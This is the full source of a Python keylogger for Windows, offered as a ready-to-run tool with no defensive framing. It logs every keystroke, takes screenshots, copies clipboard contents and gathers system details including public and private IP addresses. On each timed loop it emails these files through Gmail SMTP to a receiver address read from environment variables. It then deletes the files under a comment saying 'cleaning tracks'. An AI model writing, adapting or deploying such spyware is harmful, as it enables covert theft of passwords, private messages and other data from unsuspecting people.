import optparse

# For environment variables
from dotenv import load_dotenv
load_dotenv()

from pynput.keyboard import Key, Listener      #for keylogger
import logging

from email.mime.multipart import MIMEMultipart   #for email
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import ssl

import socket
import platform                             #for system information
from requests import get

from PIL import ImageGrab                          #for screenshots

import win32clipboard                               #for clipboard

import time                                        #system time
import os

parser=optparse.OptionParser()

parser.add_option("-f","--filepath",dest="filepath",help="Input the file path in raw string(otherwise it will not work) you want to save all of the keylogger files")
parser.add_option("-n","--loopno",dest="iteration_end",help="Input the no of iteration(integer value only) you want to use to send mails and run all other functions")
# parser.add_option("-s","--sender",dest="email",help="Input the sender email to send all the keylogger files")
# parser.add_option("-p","--pass",dest="password",help="Input the app password of Python of the sender(activate 2FA and then create new app password for python")
# parser.add_option("-r","--receiver",dest="receiver",help="Input the receiver email to send all the keylogger files")

(option,arguements)=parser.parse_args()

filepath=option.filepath
iteration_end=int(option.iteration_end)
# email=option.email
# password=option.password
# receiver=option.receiver
email = os.environ["SENDER"]
password = os.environ["PASSWORD"]
receiver = os.environ["RECEIVER"]

if not option.filepath:
    parser.error("[-] Please specify the filepath")
elif not option.iteration_end:
    parser.error("[-] Please specify the no of iteration")
# elif not option.email:
#     parser.error("[-] Please specify sender email")
# elif not option.password:
#     parser.error("[-] Please specify sender Python password")
# elif not option.receiver:
#     parser.error("[-] Please specify receiver email")
elif not email:
    parser.error("[-] Please specify sender email")
elif not password:
    parser.error("[-] Please specify sender Python password")
elif not receiver:
    parser.error("[-] Please specify receiver email")
else:
    extend="\\"
    logfile_path = filepath+extend      

    log="log.txt"
    systemfile="systeminfo.txt"
    screenshot_info="screenshot.png"
    clipboardinfo="clip.txt"

    time_iteration=10

    #sending mail
    def send_mail(filename, attachment, receiver):
        sender=email

        msg=MIMEMultipart()

        msg['From']=sender
        msg['To']=receiver
        msg['Subject']="Keylogger File"

        body="Body_of_mail"

        msg.attach(MIMEText(body,'plain'))

        filename=filename
        attachment=open(attachment,'rb')

        p=MIMEBase('application','octet-stream')

        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

        msg.attach(p)

        context=ssl.create_default_context()

        with smtplib.SMTP_SSL('smtp.gmail.com',465, context=context) as s:
            s.login(sender, password)
            text=msg.as_string()
            s.sendmail(sender,receiver,text)
            s.quit()

    #system information
    def comp_info():
        with open(logfile_path+systemfile, "w") as f:
                f.write(" ")
        with open(logfile_path + systemfile,"a") as f:
            hostname=socket.gethostname()
            ip_addr=socket.gethostbyname(hostname)
        
            try:
                    public_ip = get("https://api.ipify.org").text
                    f.write("Public IP Address: " + public_ip+"\n")
            except Exception:
                    f.write("Couldn't get Public IP Address (most likely max query\n")
            f.write("Processor: "+(platform.processor())+"\n")
            f.write("System: "+platform.system()+" "+platform.version()+"\n")
            f.write("Machine: "+platform.machine()+"\n")
            f.write("Hostname: "+hostname+"\n")
            f.write("Private IP adress: "+ip_addr+"\n")
            f.close()

    comp_info()
    send_mail(systemfile,logfile_path+systemfile,receiver)

    #screenshots
    def screenshots():
        im=ImageGrab.grab()
        im.save(logfile_path+screenshot_info)


    #clipboard
    def clipboard_copy():
        with open(logfile_path+clipboardinfo,"w") as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                f.write("Clipboard Data: \n" + pasted_data)
            except:
                f.write("Clipboard could be not be copied")


    iteration_no=0
    currentTime=time.time()
    stoppingTime=time.time()+time_iteration

    while iteration_no<iteration_end:
        #basic keylogger 
        logging.basicConfig(filename = (logfile_path + log), level=logging.DEBUG, format='%(asctime)s: %(message)s')
        def on_press(key):
            global currentTime
            k=str(key).replace("'","")
            logging.info(str(k)+" ")
            currentTime=time.time()
        
        def on_release(key):
            if currentTime > stoppingTime:
                return False
                

        with Listener(on_press=on_press,on_release=on_release) as listener:
            listener.join()
        
        if currentTime>stoppingTime:
            send_mail(log, logfile_path + log, receiver)
            with open(logfile_path+log, "w") as f:
                f.write(" ")
                f.close()

            screenshots()
            send_mail(screenshot_info,logfile_path+screenshot_info,receiver)

            clipboard_copy()
            send_mail(clipboardinfo,logfile_path+clipboardinfo,receiver)

            iteration_no+=1
            currentTime=time.time()
            stoppingTime=time.time()+time_iteration
            listener.stop()

    #cleaning tracks
    delete_files = [systemfile, clipboardinfo, screenshot_info]
    for file in delete_files:
        os.remove(logfile_path + file)